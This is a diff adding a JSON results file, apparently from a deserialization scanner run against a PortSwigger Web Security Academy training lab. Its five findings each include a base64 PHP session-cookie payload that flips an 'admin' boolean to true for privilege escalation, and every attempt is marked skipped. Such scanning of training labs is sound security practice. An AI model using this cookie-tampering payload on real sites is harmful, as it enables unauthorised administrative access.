@@ -1,0 +1,161 @@
+{
+  "findings": [
+    {
+      "attempts": [
+        {
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "payload_type": "flip_boolean",
+          "reason": "Request failed: Invalid header name b':Authority'",
+          "skipped": true
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "indicators": [],
+      "likely_vulnerable": false,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 1,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "severity": "High",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "flip_boolean",
+      "type": "PHP",
+      "url": "https://0ae700090497058180b88ae0000600eb.web-security-academy.net/"
+    },
+    {
+      "attempts": [
+        {
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "payload_type": "flip_boolean",
+          "reason": "Request failed: Invalid header name b':Authority'",
+          "skipped": true
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "indicators": [],
+      "likely_vulnerable": false,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 1,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "severity": "High",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "flip_boolean",
+      "type": "PHP",
+      "url": "https://0ae700090497058180b88ae0000600eb.web-security-academy.net/my-account?id=wiener"
+    },
+    {
+      "attempts": [
+        {
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "payload_type": "flip_boolean",
+          "reason": "Request failed: Invalid header name b':Authority'",
+          "skipped": true
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "indicators": [],
+      "likely_vulnerable": false,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 1,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "severity": "High",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "flip_boolean",
+      "type": "PHP",
+      "url": "https://0ae700090497058180b88ae0000600eb.web-security-academy.net/my-account?id=wiener"
+    },
+    {
+      "attempts": [
+        {
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "payload_type": "flip_boolean",
+          "reason": "Request failed: Invalid header name b':Authority'",
+          "skipped": true
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "indicators": [],
+      "likely_vulnerable": false,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 1,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "severity": "High",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "flip_boolean",
+      "type": "PHP",
+      "url": "https://0ae700090497058180b88ae0000600eb.web-security-academy.net/my-account?id=wiener"
+    },
+    {
+      "attempts": [
+        {
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=",
+          "payload_type": "flip_boolean",
+          "reason": "Request failed: Invalid header name b':Authority'",
+          "skipped": true
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — Boolean Flip",
+      "indicators": [],
+      "likely_vulnerable": false,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 1,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:0;}"
+      ],
+      "notes": "Boolean field detected — try flipping b:0 → b:1",
+      "severity": "High",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "flip_boolean",
+      "type": "PHP",
+      "url": "https://0ae700090497058180b88ae0000600eb.web-security-academy.net/product?productId=1"
+    }
+  ],
+  "stats": {
+    "after_filter": 5,
+    "findings": 5,
+    "likely_vulnerable": 0,
+    "vectors_scanned": 143
+  },
+  "target": "0ae700090497058180b88ae0000600eb.web-security-academy.net"
+}
